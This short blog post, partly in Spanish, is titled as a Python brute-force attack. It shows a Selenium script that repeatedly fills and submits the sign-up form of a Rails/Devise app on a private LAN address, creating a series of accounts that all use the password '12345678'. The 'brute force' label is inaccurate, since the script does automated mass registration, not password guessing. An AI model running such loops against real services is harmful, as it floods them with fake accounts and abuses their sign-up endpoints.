---
layout: post
title:  "Python - Ataque fuerza bruta"
date:   2016-05-01 00:37:19 -0300
categories: rails security
---

To install pip, securely download <a src="https://bootstrap.pypa.io/get-pip.py">get-pip.py</a>


```
python get-pip.py
```

To install selenium


```
pip install selenium
```

Script brutal force, el ejemplo esta realizado para funcionar sobre rails 4 con devise instalado por defecto.

{% highlight python %}
#!/usr/bin/python

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
def bForce():
	driver = webdriver.Firefox()
	driver.get("http://192.168.0.3:3001/users/sign_up")
	for i in range(59, 90):
		user = driver.find_element_by_xpath("//*[@id=\"user_email\"]")
		user.send_keys("rr"+str(i)+"@rrr.com")
		password = driver.find_element_by_xpath("//*[@id=\"user_password\"]")
		password.send_keys("12345678")
		pass_confirm = driver.find_element_by_xpath("//*[@id=\"user_password_confirmation\"]")
		pass_confirm.send_keys("12345678")
		driver.find_element_by_name("commit").click()
		close = driver.find_element_by_xpath("/html/body/li/a")
		close.click()
		driver.get("http://192.168.0.3:3001/users/sign_up")
	driver.close()
bForce()


{% endhighlight %}